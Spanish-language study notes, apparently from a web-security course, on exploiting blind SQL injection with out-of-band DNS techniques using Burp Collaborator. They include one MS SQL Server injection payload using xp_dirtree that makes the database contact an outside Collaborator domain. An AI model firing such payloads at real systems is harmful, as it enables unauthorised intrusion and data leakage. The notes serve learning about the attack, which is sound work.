# Explotación de la inyección SQL ciega mediante técnicas fuera de banda (OAST)

Puede ser que la aplicación web, realize la consulta de forma asincrónica. En el hilo origninal atiende a la solicitud del usuario y otro hilo para ejecutar la consulta SQL utilizando la cookie de seguimiento.
En esta situación la SQLi blind seria atraves de interacciones de red fuera de banda con un sistema que tenmos control. Estos se pueden activar en funcion de la condicion inyectada para inferir información pieza por pieza.

Normalmente se usa el protocolo DNS. Ya que este es esencial. Muchas redes permiten la salida de consultas DNS.


La herramienta burp collaborator, para técnicas fuera de banda. Servidor que proporciona implementaciones personalizadas de varios servicios de red.
Permite la detecion de cuando ocurren interacciones de red como resultado del envio de payloads individuales a una aplicaion vulnerable. 

MIc SQL server se puede uutilizar para probocar una busqueda de DNS en un dominio especifico: 
```bash
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```
Esto hace que la base de datos realice una búsqueda del siguiente dominio:
```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```
Puede utilizar Burp Collaborator para generar un subdominio único y sondear el servidor Collaborator para confirmar cuándo se produce alguna búsqueda de DNS.

# LAB 1 y 2 se hacen con el pro (MIrar más adelante)



